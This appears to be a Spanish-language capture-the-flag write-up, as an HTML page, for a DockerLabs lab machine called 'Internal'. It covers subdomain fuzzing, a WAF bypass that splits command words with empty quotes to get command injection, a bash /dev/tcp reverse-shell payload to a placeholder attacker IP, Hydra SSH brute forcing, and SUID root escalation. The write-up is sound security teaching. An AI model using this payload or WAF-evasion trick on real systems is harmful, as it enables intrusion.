@@ -1,0 +1,676 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Internal — Writeup</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@300;500;700&family=Space+Mono:ital,wght@0,400;0,700;1,400&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg: #0a0c0f;
+    --bg2: #0f1318;
+    --bg3: #141920;
+    --accent: #3b82f6;
+    --accent2: #ff6b35;
+    --accent3: #60a5fa;
+    --text: #c8d6e5;
+    --text-dim: #5a7080;
+    --border: #1e2d3d;
+    --red: #ff4757;
+    --yellow: #ffd32a;
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Rajdhani', sans-serif;
+    font-size: 17px;
+    line-height: 1.7;
+    overflow-x: hidden;
+  }
+
+  body::before {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background: repeating-linear-gradient(
+      0deg,
+      transparent,
+      transparent 2px,
+      rgba(59,130,246,0.012) 2px,
+      rgba(59,130,246,0.012) 4px
+    );
+    pointer-events: none;
+    z-index: 999;
+  }
+
+  header {
+    position: relative;
+    padding: 80px 0 60px;
+    text-align: center;
+    border-bottom: 1px solid var(--border);
+    overflow: hidden;
+  }
+
+  header::before {
+    content: '';
+    position: absolute;
+    inset: 0;
+    background:
+      radial-gradient(ellipse 60% 80% at 50% 0%, rgba(37,99,235,0.12) 0%, transparent 70%),
+      radial-gradient(ellipse 40% 40% at 80% 80%, rgba(59,130,246,0.06) 0%, transparent 60%);
+  }
+
+  .header-tag {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+    letter-spacing: 4px;
+    color: var(--accent3);
+    text-transform: uppercase;
+    margin-bottom: 16px;
+    opacity: 0.8;
+  }
+
+  h1 {
+    font-family: 'Rajdhani', sans-serif;
+    font-size: clamp(52px, 8vw, 96px);
+    font-weight: 700;
+    letter-spacing: -2px;
+    color: #fff;
+    line-height: 1;
+    position: relative;
+  }
+
+  h1 .glow {
+    color: var(--accent3);
+    text-shadow: 0 0 40px rgba(96,165,250,0.6), 0 0 80px rgba(96,165,250,0.2);
+  }
+
+  .header-meta {
+    margin-top: 24px;
+    display: flex;
+    gap: 12px;
+    justify-content: center;
+    flex-wrap: wrap;
+  }
+
+  .tag {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+    padding: 4px 12px;
+    border: 1px solid;
+    letter-spacing: 2px;
+  }
+  .tag.linux   { border-color: var(--accent);  color: var(--accent); }
+  .tag.web     { border-color: var(--accent3); color: var(--accent3); }
+  .tag.rce     { border-color: var(--yellow);  color: var(--yellow); }
+  .tag.suid    { border-color: var(--accent2); color: var(--accent2); }
+  .tag.hydra   { border-color: var(--red);     color: var(--red); }
+
+  .container {
+    max-width: 900px;
+    margin: 0 auto;
+    padding: 0 32px;
+  }
+
+  .phase {
+    padding: 64px 0;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .phase-header {
+    display: flex;
+    align-items: center;
+    gap: 20px;
+    margin-bottom: 36px;
+  }
+
+  .phase-num {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+    color: var(--accent);
+    letter-spacing: 3px;
+    white-space: nowrap;
+    opacity: 0.7;
+  }
+
+  .phase-line {
+    flex: 1;
+    height: 1px;
+    background: linear-gradient(90deg, var(--border), transparent);
+  }
+
+  h2 {
+    font-family: 'Rajdhani', sans-serif;
+    font-size: 32px;
+    font-weight: 700;
+    color: #fff;
+    letter-spacing: 1px;
+    margin-bottom: 24px;
+  }
+
+  h2 .accent  { color: var(--accent); }
+  h2 .accent2 { color: var(--accent2); }
+  h2 .accent3 { color: var(--accent3); }
+  h2 .yellow  { color: var(--yellow); }
+  h2 .red     { color: var(--red); }
+
+  p {
+    color: var(--text);
+    margin-bottom: 16px;
+    font-weight: 300;
+    font-size: 17px;
+  }
+
+  .code-block {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    border-left: 3px solid var(--accent);
+    padding: 20px 24px;
+    margin: 20px 0;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 13px;
+    color: #93c5fd;
+    overflow-x: auto;
+    position: relative;
+    line-height: 1.8;
+    white-space: pre;
+  }
+
+  .code-block.cmd    { border-left-color: var(--accent2); color: #f0a080; }
+  .code-block.output { border-left-color: var(--text-dim); color: var(--text-dim); font-size: 12px; }
+  .code-block.shell  { border-left-color: var(--red);     color: #f87171; }
+  .code-block.yellow { border-left-color: var(--yellow);  color: #f0e080; }
+
+  .code-label {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 10px;
+    letter-spacing: 3px;
+    color: var(--text-dim);
+    text-transform: uppercase;
+    margin-bottom: 8px;
+  }
+
+  .finding {
+    background: var(--bg3);
+    border: 1px solid var(--border);
+    padding: 20px 24px;
+    margin: 20px 0;
+    position: relative;
+  }
+
+  .finding::before {
+    content: '!';
+    position: absolute;
+    top: -1px;
+    left: -1px;
+    background: var(--accent2);
+    color: #000;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+    font-weight: bold;
+    padding: 2px 8px;
+    letter-spacing: 2px;
+  }
+
+  .finding.info::before    { content: 'INFO';  background: var(--accent3); color: #fff; }
+  .finding.success::before { content: 'PWN';   background: var(--accent);  color: #fff; }
+  .finding.vuln::before    { content: 'VULN';  background: var(--red);     color: #fff; }
+  .finding.explain::before { content: 'CÓMO FUNCIONA'; background: var(--yellow); color: #000; }
+
+  .finding-title {
+    font-family: 'Rajdhani', sans-serif;
+    font-size: 14px;
+    font-weight: 700;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    color: var(--text-dim);
+    margin-bottom: 8px;
+    padding-top: 4px;
+  }
+
+  .ports-table {
+    width: 100%;
+    border-collapse: collapse;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 13px;
+    margin: 20px 0;
+  }
+
+  .ports-table th {
+    text-align: left;
+    color: var(--accent);
+    letter-spacing: 3px;
+    font-size: 10px;
+    padding: 8px 16px;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .ports-table td {
+    padding: 10px 16px;
+    border-bottom: 1px solid rgba(30,45,61,0.5);
+    color: var(--text);
+  }
+
+  .ports-table tr:hover td { background: rgba(59,130,246,0.03); }
+  .port-open { color: var(--accent); }
+  .port-num  { color: var(--accent2); font-weight: bold; }
+
+  .flag-box {
+    background: rgba(59,130,246,0.04);
+    border: 1px solid rgba(59,130,246,0.25);
+    padding: 16px 24px;
+    margin: 20px 0;
+    display: flex;
+    align-items: center;
+    gap: 16px;
+  }
+
+  .flag-label {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 10px;
+    letter-spacing: 3px;
+    color: var(--accent);
+    white-space: nowrap;
+  }
+
+  .flag-value {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 14px;
+    color: #fff;
+    word-break: break-all;
+  }
+
+  code {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 13px;
+    color: var(--accent);
+    background: rgba(59,130,246,0.08);
+    padding: 1px 6px;
+  }
+
+  code.bad  { color: var(--red);    background: rgba(255,71,87,0.07); }
+  code.warn { color: var(--yellow); background: rgba(255,211,42,0.07); }
+
+  .highlight { color: var(--accent2); }
+
+  /* Diagrama de flujo del bypass WAF */
+  .flow { display: flex; flex-direction: column; gap: 0; margin: 28px 0; }
+  .flow-step { display: flex; gap: 16px; align-items: flex-start; }
+  .flow-icon {
+    width: 36px;
+    height: 36px;
+    border: 1px solid var(--border);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 12px;
+    color: var(--yellow);
+    flex-shrink: 0;
+    background: var(--bg2);
+  }
+  .flow-connector { width: 36px; display: flex; justify-content: center; flex-shrink: 0; }
+  .flow-connector::before {
+    content: '';
+    width: 1px;
+    background: linear-gradient(180deg, var(--border), transparent);
+    min-height: 18px;
+    display: block;
+  }
+  .flow-content { padding-bottom: 20px; }
+  .flow-title { font-family: 'Rajdhani', sans-serif; font-weight: 700; font-size: 16px; color: #fff; margin-bottom: 2px; }
+  .flow-desc  { font-size: 15px; color: var(--text-dim); font-weight: 300; }
+
+  .chain { display: flex; flex-direction: column; gap: 0; margin: 32px 0; }
+  .chain-step { display: flex; gap: 20px; align-items: flex-start; }
+
+  .chain-icon {
+    width: 40px;
+    height: 40px;
+    border: 1px solid var(--border);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 13px;
+    color: var(--accent);
+    flex-shrink: 0;
+    background: var(--bg2);
+  }
+
+  .chain-connector {
+    width: 40px;
+    display: flex;
+    justify-content: center;
+    padding: 4px 0;
+    flex-shrink: 0;
+  }
+
+  .chain-connector::before {
+    content: '';
+    width: 1px;
+    height: 100%;
+    background: linear-gradient(180deg, var(--border), transparent);
+    min-height: 20px;
+    display: block;
+  }
+
+  .chain-content { padding-bottom: 24px; }
+
+  .chain-title {
+    font-family: 'Rajdhani', sans-serif;
+    font-weight: 700;
+    font-size: 18px;
+    color: #fff;
+    margin-bottom: 4px;
+  }
+
+  .chain-desc { font-size: 15px; color: var(--text-dim); font-weight: 300; }
+
+  footer { padding: 48px 0; text-align: center; }
+
+  .footer-text {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+    color: var(--text-dim);
+    letter-spacing: 3px;
+  }
+
+  .divider {
+    height: 1px;
+    background: linear-gradient(90deg, transparent, var(--border), transparent);
+    margin: 8px 0;
+  }
+</style>
+</head>
+<body>
+
+<header>
+  <div class="container">
+    <div class="header-tag">// DockerLabs — CTF Writeup</div>
+    <h1>INTER<span class="glow">NAL</span></h1>
+    <div class="header-meta">
+      <span class="tag linux">#linux</span>
+      <span class="tag web">#web</span>
+      <span class="tag rce">#rce</span>
+      <span class="tag suid">#suid</span>
+      <span class="tag hydra">#hydra</span>
+    </div>
+  </div>
+</header>
+
+<main class="container">
+
+  <!-- FASE 1: RECONOCIMIENTO -->
+  <section class="phase">
+    <div class="phase-header">
+      <span class="phase-num">// 01</span>
+      <div class="phase-line"></div>
+    </div>
+    <h2><span class="accent">RECONOCIMIENTO</span> — Escaneo de puertos</h2>
+
+    <p>Se lanza un escaneo completo para descubrir la superficie de ataque disponible en la máquina víctima.</p>
+
+    <div class="code-label">escaneo inicial</div>
+    <div class="code-block cmd">nmap -p- -T5 &lt;IP&gt; -oG allPorts</div>
+
+    <table class="ports-table">
+      <thead>
+        <tr>
+          <th>PUERTO</th>
+          <th>ESTADO</th>
+          <th>SERVICIO</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr><td class="port-num">22/tcp</td><td class="port-open">OPEN</td><td>SSH</td></tr>
+        <tr><td class="port-num">80/tcp</td><td class="port-open">OPEN</td><td>HTTP</td></tr>
+      </tbody>
+    </table>
+
+    <p>La superficie es reducida: una web y SSH. Al intentar acceder directamente por IP al puerto 80, el navegador no puede resolver el nombre de host porque la aplicación espera un virtual host específico. Hay que añadir la entrada correspondiente al fichero <code>/etc/hosts</code> de la máquina atacante:</p>
+
+    <div class="code-label">/etc/hosts</div>
+    <div class="code-block yellow">172.17.0.2 internal.dl</div>
+
+    <p>Con esto ya es posible acceder a la web. A simple vista no hay nada aprovechable en la página principal, así que se procede a enumerar subdirectorios con <strong style="color:#fff">gobuster</strong>:</p>
+
+    <div class="code-label">fuzzing de directorios</div>
+    <div class="code-block cmd">gobuster dir -u "http://internal.dl/" -w &lt;DICCIONARIO&gt; -x php,txt,html,js</div>
+
+    <p>Gobuster no encuentra nada relevante en la raíz, así que se amplía la enumeración buscando <strong style="color:#fff">subdominios</strong> con <strong style="color:#fff">ffuf</strong>. La idea es que el servidor pueda estar sirviendo aplicaciones distintas según el valor del header <code>Host</code>:</p>
+
+    <div class="code-label">fuzzing de subdominios (virtual hosts)</div>
+    <div class="code-block cmd">ffuf -c -w &lt;DICCIONARIO&gt; -u 'http://internal.dl/' -H "Host: FUZZ.internal.dl"</div>
+
+    <div class="code-block output">backup    [Status: 200, Size: 22554, Words: 4271, Lines: 812, Duration: 20ms]
+Backup    [Status: 200, Size: 22554, Words: 4271, Lines: 812, Duration: 2ms]</div>
+
+    <div class="finding info">
+      <div class="finding-title">¿Qué es el fuzzing de virtual hosts?</div>
+      Un mismo servidor web puede alojar múltiples aplicaciones distintas según el valor del header HTTP <code>Host</code>. Al hacer fuzzing de subdominios con ffuf, se envían peticiones variando ese header con palabras de un diccionario. Si el servidor responde distinto (tamaño o código de respuesta diferente), es señal de que existe esa aplicación. Aquí se descubren <code>backup.internal.dl</code> y <code>Backup.internal.dl</code>.
+    </div>
+
+    <p>Se añaden los subdominios descubiertos al <code>/etc/hosts</code>:</p>
+
+    <div class="code-label">/etc/hosts actualizado</div>
+    <div class="code-block yellow">172.17.0.2 internal.dl backup.internal.dl Backup.internal.dl</div>
+  </section>
+
+  <!-- FASE 2: RCE -->
+  <section class="phase">
+    <div class="phase-header">
+      <span class="phase-num">// 02</span>
+      <div class="phase-line"></div>
+    </div>
+    <h2><span class="yellow">REMOTE CODE EXECUTION</span> — Bypass del WAF con quote splitting</h2>
+
+    <p>Al acceder a <code>backup.internal.dl</code> se encuentra una aplicación web llamada <strong style="color:#fff">Directory Inspector</strong>. Permite introducir una ruta del sistema de ficheros y listar su contenido. Internamente ejecuta un comando del sistema operativo con la ruta proporcionada.</p>
+
+    <p>El primer intento de inyección de comandos con el operador <code>;</code> resulta bloqueado por el WAF (Web Application Firewall) de la aplicación. Probando con el operador <code>|</code> el error es distinto: ya no bloquea el operador, sino el comando en sí. Esto indica que hay dos capas de filtrado independientes: una para operadores y otra para comandos conocidos.</p>
+
+    <div class="finding vuln">
+      <div class="finding-title">Análisis del WAF</div>
+      El WAF comprueba si la entrada contiene operadores de shell peligrosos (<code class="bad">;</code>, <code class="bad">|</code>, etc.) y también si contiene comandos en una lista negra (<code class="bad">id</code>, <code class="bad">bash</code>, etc.). Sin embargo, la comprobación se hace sobre la cadena completa y de forma literal, sin interpretar el contexto de shell. Esto lo hace vulnerable a técnicas de ofuscación.
+    </div>
+
+    <p>El bypass consiste en fragmentar la palabra del comando usando comillas vacías <code>''</code> en medio de ella. El shell de Linux interpreta las comillas vacías como una cadena de longitud cero y las ignora al ejecutar, reconstruyendo el comando original. Sin embargo, el WAF hace una comparación de subcadenas literal y no reconoce el comando porque aparece partido.</p>
+
+    <div class="flow">
+      <div class="flow-step">
+        <div class="flow-icon">1</div>
+        <div class="flow-content">
+          <div class="flow-title">WAF ve la cadena</div>
+          <div class="flow-desc"><code>| i''d</code> — El filtro busca la palabra <code class="bad">id</code> literalmente. No la encuentra porque está escrita como <code>i''d</code>, así que deja pasar la petición.</div>
+        </div>
+      </div>
+      <div class="flow-step"><div class="flow-connector"></div><div></div></div>
+      <div class="flow-step">
+        <div class="flow-icon">2</div>
+        <div class="flow-content">
+          <div class="flow-title">Shell interpreta el comando</div>
+          <div class="flow-desc">Bash procesa <code>i''d</code>: las comillas vacías son expansión vacía, así que el resultado es simplemente <code>id</code>. El comando se ejecuta con normalidad.</div>
+        </div>
+      </div>
+      <div class="flow-step"><div class="flow-connector"></div><div></div></div>
+      <div class="flow-step">
+        <div class="flow-icon">3</div>
+        <div class="flow-content">
+          <div class="flow-title">RCE confirmado</div>
+          <div class="flow-desc">La salida devuelve el usuario del proceso: <code>uid=33(www-data) gid=33(www-data) groups=33(www-data)</code>. El bypass funciona.</div>
+        </div>
+      </div>
+    </div>
+
+    <p>Con el bypass confirmado, se construye la reverse shell aplicando la misma técnica de quote splitting a las palabras <code>bash</code> y <code>ash</code>, que también estarán en la lista negra:</p>
+
+    <div class="code-label">payload de reverse shell (campo de ruta en la web)</div>
+    <div class="code-block shell">| b''ash -c "b''ash -i >& /dev/tcp/&lt;IP_ATACANTE&gt;/4444 0>&1"</div>
+
+    <div class="code-label">listener en la máquina atacante</div>
+    <div class="code-block cmd">nc -lvnp 4444</div>
+
+    <div class="code-block output">www-data@a9cb375ae498:/$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)</div>
+
+    <div class="finding explain">
+      <div class="finding-title">¿Por qué funciona b''ash?</div>
+      En bash, una cadena como <code>b''ash</code> se procesa en tres partes: el literal <code>b</code>, la expansión vacía <code>''</code> (que produce nada), y el literal <code>ash</code>. Al concatenarlas, bash obtiene <code>bash</code> y lo ejecuta como comando. El WAF, que realiza una búsqueda de subcadena simple sin interpretar el lenguaje de shell, no detecta la palabra prohibida porque está fragmentada. Esta técnica se conoce como <strong style="color:#fff">quote splitting</strong> o <strong style="color:#fff">quote removal bypass</strong>.
+    </div>
+  </section>
+
+  <!-- FASE 3: ESCALADA HORIZONTAL -->
+  <section class="phase">
+    <div class="phase-header">
+      <span class="phase-num">// 03</span>
+      <div class="phase-line"></div>
+    </div>
+    <h2><span class="accent3">ESCALADA HORIZONTAL</span> — Fuerza bruta SSH con Hydra</h2>
+
+    <p>Estando dentro del sistema como <code>www-data</code>, se explora el sistema de ficheros en busca de información sensible. En el directorio <code>/opt</code> se encuentra un fichero llamado <strong style="color:#fff">.vault_pass.txt</strong>, propiedad del usuario <code>vault</code> pero legible por <code>www-data</code>:</p>
+
+    <div class="code-block output">www-data@a9cb375ae498:/opt$ ls -la
+drwxr-xr-x 1 www-data www-data  4096 Feb 25 15:02 .
+drwxr-xr-x 1 root     root      4096 Mar  4 02:00 ..
+-rw-r--r-- 1 www-data vault      260 Feb 25 13:24 .vault_pass.txt
+drwxrwxr-x 1 root     vault     4096 Feb 26 10:50 vaultlibs
+
+www-data@a9cb375ae498:/opt$ cat .vault_pass.txt
+X#9mK$vL2@pQ
+nR7!wZ3&eT5*
+Hy6@jP2#mX8$
+[... más entradas ...]
+Yk8$pZ5@cN4!
+[...]</div>
+
+    <p>El fichero contiene una lista de contraseñas candidatas. Todo apunta a que alguna de ellas es la contraseña del usuario <code>vault</code>. Se usa <strong style="color:#fff">Hydra</strong> para hacer fuerza bruta sobre SSH con esa lista:</p>
+
+    <div class="code-label">ataque de fuerza bruta con hydra</div>
+    <div class="code-block cmd">hydra -l vault -P vault_pass.txt ssh://172.17.0.2</div>
+
+    <div class="code-block output">[22][ssh] host: 172.17.0.2   login: vault   password: Yk8$pZ5@cN4!
+1 of 1 target successfully completed, 1 valid password found</div>
+
+    <div class="finding info">
+      <div class="finding-title">Credenciales encontradas</div>
+      Usuario <span class="highlight">vault</span> con contraseña <span class="highlight">Yk8$pZ5@cN4!</span> obtenidas mediante fuerza bruta contra SSH usando el diccionario hallado en la propia máquina.
+    </div>
+
+    <p>Se accede directamente por SSH en vez de pivotar desde la reverse shell, obteniendo así una sesión más estable e interactiva:</p>
+
+    <div class="code-label">acceso ssh como vault</div>
+    <div class="code-block cmd">ssh vault@172.17.0.2
+Password: Yk8$pZ5@cN4!</div>
+  </section>
+
+  <!-- FASE 4: PRIVESC -->
+  <section class="phase">
+    <div class="phase-header">
+      <span class="phase-num">// 04</span>
+      <div class="phase-line"></div>
+    </div>
+    <h2><span class="accent2">PRIVILEGE ESCALATION</span> — SUID en binario personalizado</h2>
+
+    <p>Ya como usuario <code>vault</code>, el objetivo es escalar a <strong style="color:#fff">root</strong>. Una de las técnicas más habituales en Linux es buscar binarios con el bit SUID activado. Un binario SUID se ejecuta siempre con los permisos de su propietario (normalmente root), independientemente de quién lo lance:</p>
+
+    <div class="code-label">búsqueda de binarios con SUID de root</div>
+    <div class="code-block cmd">find / -perm -4000 -ls 2>/dev/null</div>
+
+    <div class="code-block output">1074471   16 -rwsr-xr--   1 root   vault   16136 Feb 25 15:00 /usr/local/bin/vaultctl
+1060928   36 -rwsr-xr--   1 root   messagebus  34960 Aug  8  2024 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+[... binarios estándar del sistema ...]</div>
+
+    <div class="finding vuln">
+      <div class="finding-title">Binario SUID sospechoso</div>
+      Existe un binario no estándar llamado <code>/usr/local/bin/vaultctl</code> con SUID de root. A diferencia del resto de binarios SUID (que son del sistema y bien conocidos), este es un ejecutable personalizado. Su permiso <code>rwsr-xr--</code> indica que es ejecutable por el grupo <code>vault</code> — al que pertenece nuestro usuario — y corre con privilegios de root.
+    </div>
+
+    <div class="finding explain">
+      <div class="finding-title">¿Qué es el bit SUID?</div>
+      El bit SUID (Set User ID) es un permiso especial de Unix que, cuando está activo en un ejecutable, hace que el proceso se ejecute con la identidad del <strong>propietario del fichero</strong> en vez del usuario que lo lanza. Si el propietario es root y el binario no valida correctamente lo que hace, cualquier usuario que pueda ejecutarlo obtiene una vía para escalar privilegios. Es por eso que los binarios SUID de root son un vector de escalada clásico.
+    </div>
+
+    <p>Se ejecuta el binario directamente. Sin necesidad de argumentos especiales, <code>vaultctl</code> escala automáticamente los privilegios del proceso actual a root:</p>
+
+    <div class="code-label">explotación del binario suid</div>
+    <div class="code-block cmd">vault@a9cb375ae498:~$ /usr/local/bin/vaultctl</div>
+
+    <div class="code-block output">root@a9cb375ae498:~# whoami
+root</div>
+
+    <div class="finding success">
+      <div class="finding-title">Root obtenido</div>
+      El binario <code>vaultctl</code>, al ejecutarse con SUID de root, eleva automáticamente los privilegios a <code>root</code>. Probablemente el binario invoca <code>setuid(0)</code> o lanza una shell sin validar el entorno, lo que es suficiente para obtener acceso completo al sistema.
+    </div>
+  </section>
+
+  <!-- RESUMEN -->
+  <section class="phase">
+    <div class="phase-header">
+      <span class="phase-num">// RESUMEN</span>
+      <div class="phase-line"></div>
+    </div>
+    <h2>CADENA DE <span class="accent">ATAQUE</span></h2>
+
+    <div class="chain">
+      <div class="chain-step">
+        <div class="chain-icon">01</div>
+        <div class="chain-content">
+          <div class="chain-title">Enumeración Web + Virtual Hosts</div>
+          <div class="chain-desc">Gobuster no encuentra nada relevante en la raíz → ffuf descubre los subdominios <code>backup.internal.dl</code> con una aplicación de inspección de directorios</div>
+        </div>
+      </div>
+      <div class="chain-step"><div class="chain-connector"></div><div></div></div>
+
+      <div class="chain-step">
+        <div class="chain-icon">02</div>
+        <div class="chain-content">
+          <div class="chain-title">Bypass WAF con Quote Splitting</div>
+          <div class="chain-desc">El WAF bloquea operadores y comandos conocidos por subcadena literal → se usa <code>b''ash</code> e <code>i''d</code> para fragmentar las palabras → RCE como <code>www-data</code></div>
+        </div>
+      </div>
+      <div class="chain-step"><div class="chain-connector"></div><div></div></div>
+
+      <div class="chain-step">
+        <div class="chain-icon" style="border-color: var(--accent3); color: var(--accent3);">03</div>
+        <div class="chain-content">
+          <div class="chain-title">Reverse Shell + Diccionario en /opt</div>
+          <div class="chain-desc">Reverse shell estable como <code>www-data</code> → se descubre <code>/opt/.vault_pass.txt</code> con lista de contraseñas candidatas</div>
+        </div>
+      </div>
+      <div class="chain-step"><div class="chain-connector"></div><div></div></div>
+
+      <div class="chain-step">
+        <div class="chain-icon" style="border-color: var(--red); color: var(--red);">04</div>
+        <div class="chain-content">
+          <div class="chain-title">Hydra → SSH como vault</div>
+          <div class="chain-desc">Fuerza bruta SSH con el propio diccionario de la máquina → contraseña <code>Yk8$pZ5@cN4!</code> → sesión SSH como <code>vault</code></div>
+        </div>
+      </div>
+      <div class="chain-step"><div class="chain-connector"></div><div></div></div>
+
+      <div class="chain-step">
+        <div class="chain-icon" style="border-color: var(--accent); color: var(--accent);">⚡</div>
+        <div class="chain-content">
+          <div class="chain-title" style="color: var(--accent);">SUID vaultctl → Root</div>
+          <div class="chain-desc">Binario <code>/usr/local/bin/vaultctl</code> con SUID de root ejecutable por el grupo <code>vault</code> → escalada a root sin argumentos adicionales</div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+</main>
+
+<footer>
+  <div class="container">
+    <div class="divider"></div>
+    <br>
+    <div class="footer-text">INTERNAL // WRITEUP // DOCKERLABS</div>
+  </div>
+</footer>
+
+</body>
+</html>
